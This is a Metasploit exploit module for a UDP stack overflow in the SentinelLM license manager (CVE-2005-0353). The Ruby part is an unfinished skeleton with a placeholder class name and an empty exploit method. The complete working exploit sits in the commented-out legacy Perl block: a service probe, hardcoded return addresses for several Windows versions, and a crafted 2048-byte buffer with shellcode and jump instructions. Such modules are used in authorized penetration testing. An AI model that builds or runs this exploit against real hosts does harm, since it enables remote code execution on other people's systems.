require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'SentinelLM UDP Buffer Overflow',
			'Description'    => %q{
				This module exploits a simple stack overflow in the Sentinel
				License Manager. The SentinelLM service is installed with a
				wide selection of products and seems particular popular with
				academic products. If the wrong target value is selected,
				the service will crash and not restart.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '12742'],
					[ 'CVE', '2005-0353'],
					[ 'OSVDB', '14605'],
					[ 'MIL', '58'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Mar 07 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::sentinel_lm7_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'SentinelLM UDP Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 5093],
	  },

	'Payload' =>
	  {
		'Space'     => 800,
		'BadChars'  => "\x00\x20",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a simple stack overflow in the Sentinel License
	Manager. The SentinelLM service is installed with a wide selection of
	products and seems particular popular with academic products. If the wrong
	target value is selected, the service will crash and not restart.
}),

	'Refs'    =>
	  [
		['BID',   '12742'],
		['CVE',   '2005-0353'],
		['OSVDB', '14605'],
		['MIL',   '58'],
	  ],

	'Targets' =>
	  [
		['SentinelLM 7.2.0.0 Windows NT 4.0 SP4/SP5/SP6',		0x77681799 ], # ws2help.dll
		['SentinelLM 7.2.0.0 Windows 2000 English',				0x75022ac4 ], # ws2help.dll
		['SentinelLM 7.2.0.0 Windows 2000 German',				0x74fa1887 ], # ws2help.dll
		['SentinelLM 7.2.0.0 Windows XP English SP0/SP1',		0x71aa32ad ], # ws2help.dll
		['SentinelLM 7.2.0.0 Windows 2003 English SP0', 		0x7ffc0638 ], # peb
	  ],

	'Keys'    => ['sentinel'],

	'DisclosureDate' => 'Mar 07 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	$self->PrintLine("[*] Probing for the SentinelLM service....");

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $probe = "\x7a\x00\x00\x00\x00\x00";

	$s->Send($probe);
	my $res = $s->Recv(-1, 5);

	if (ord($res) == 0x7a) {
		$self->PrintLine("[*] Detected the SentinelLM service :-)");
		return $self->CheckCode('Detected');
	}

	$self->PrintLine("[*] No response to our discovery probe");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $bang = Pex::Text::EnglishText(2048);

	# Place our shellcode first thing in the string
	substr($bang, 0, length($shellcode), $shellcode);

	# Return to a pop/pop/ret and keep rolling
	substr($bang, 836, 4, pack('V', $target->[1]));

	# The pop/pop/ret takes us here, jump back five bytes
	substr($bang, 832, 2, "\xeb\xf9");

	# Jump all the way back to our shellcode
	substr($bang, 827, 5, "\xe9".pack('V', -829));

	$self->PrintLine("[*] Sending " .length($bang) . " bytes to remote host.");
	$s->Send($bang);
	$s->Recv(-1, 5);

	return;
}

1;

=end


end
end	
